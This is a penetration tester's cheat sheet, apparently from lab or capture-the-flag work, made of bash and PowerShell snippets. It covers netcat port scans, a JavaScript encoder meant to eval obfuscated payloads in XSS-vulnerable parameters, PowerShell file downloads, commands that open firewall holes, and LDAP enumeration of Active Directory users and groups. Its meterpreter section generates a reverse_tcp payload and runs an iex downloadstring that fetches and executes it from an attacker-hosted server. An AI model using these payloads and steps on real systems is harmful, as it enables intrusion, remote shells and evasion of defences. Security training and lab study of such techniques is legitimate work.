# Bash
## Portscan
  
```bash
for i in {1..254}; do nc -zv -w 1 172.16.248.$i 445; done  
  
for i in {9000..9100}; do nc -zv -w 1 10.4.195.64 $i; done
```
# Encode JavaScript

```
## Use JSCompress to flatten javascript to a single line  
www.jscompress.com  
  
## Use this function to encode javascript  
  
function encode_to_javascript(string) {  
            var input = string  
            var output = '';  
            for(pos = 0; pos < input.length; pos++) {  
                output += input.charCodeAt(pos);  
                if(pos != (input.length - 1)) {  
                    output += ",";  
                }  
            }  
            return output;  
        }  
          
let encoded = encode_to_javascript('')  
console.log(encoded)  
  
## Use this function to eval encoded javascript in XSS vulnerable parameters  
<script>eval(String.fromCharCode())</script>
```

# Powershell
## Pingsweep
```
1..20 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
```


## File Get
```
(New-Object Net.WebClient).DownloadFile('<Input File Name>','<Output File Name>')  
  
(New-Object Net.WebClient).DownloadFile('http://172.16.5.15:80/ccleaner.exe','ccleaner.exe')
```

## Punch Firewall Hole

```
New-NetFirewallRule -DisplayName "Allow 54986" -Direction Inbound -Action Allow -EdgeTraversalPolicy Allow -Protocol TCP -LocalPort 54986  
  
Get-NetFirewallProfile  
  
New-NetFirewallRule -DisplayName "Allow TCP 443" -Direction Outbound -Action Allow -Protocol TCP -RemotePort 443  
  
  
  
## Add Firewall rule for netsh rule  
netsh advfirewall firewall add rule name="port_forward_ssh_2200" protocol=TCP dir=in localip=192.168.195.64 localport=2200 action=allow  
  
## Delete firewall rule  
netsh advfirewall firewall delete rule name="port_forward_ssh_2200"  
  
## Verify rules gone  
netsh advfirewall firewall show rule name="port_forward_ssh_2200"  
  
  
## Show All Firewall Rules  
netsh advfirewall firewall show rule all  
  
## Alternate Way with only Inbound Direction  
Get-NetFirewallRule -Direction Inbound -Enabled True  
  
$target = 80  
get-netfirewallportfilter |  
? { $_.remoteport -match '-' } |   
? { $_.remoteport | foreach { if ($_ -match '-') { $beg,$end = $_ -split '-';  
  [int]$beg -le $target -and [int]$end -ge $target }}} |  
select instanceid,@{n='remoteport';e={"$($_.remoteport)"}}  
  
Show-NetFirewallRule  | where {$_.RemotePort -eq "80"}  
Get-NetFirewallPortFilter | Where-Object { $_.RemotePort -eq 80 } | Get-NetFirewallRule  
  
## Alternate way  
netsh advfirewall firewall show rule dir=out name=all | Select-String -Pattern 'Yes' -Exclude "Edge traversal" -AllMatches -Context 2,11
```


## upgrade to meterpreter

```
# On Kali  
## Generate the payloads  
python3 /usr/share/unicorn-magic/unicorn.py windows/meterpreter/reverse_tcp 10.10.14.226 443  
  
## Spawn http server to host files  
python -m http.server 80  
  
## On Windows  
iex(new-object net.webclient).downloadstring('http://10.10.14.226/powershell_attack.txt')
```

## SearchAD


```
function LDAPSearch {  
    param (  
        [string]$LDAPQuery  
    )  
  
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name  
    $DistinguishedName = ([adsi]'').distinguishedName  
  
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")  
  
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)  
  
    return $DirectorySearcher.FindAll()  
  
}  
  
Import-Module .\function.ps1  
  
LDAPSearch -LDAPQuery "(samAccountType=805306368)"  
LDAPSearch -LDAPQuery "(objectclass=group)"  
LDAPSearch -LDAPQuery "(&(objectclass=group)(cn=Service Personnel*))"  
  
$group = LDAPSearch -LDAPQuery "(&(objectclass=group)(cn=Service Personnel*))"  
  
$group.properties.member  
  
$group = LDAPSearch -LDAPQuery "(&(objectclass=group)(cn=Billing*))"  
  
LDAPSearch -LDAPQuery "(samAccountType=michelle)"
```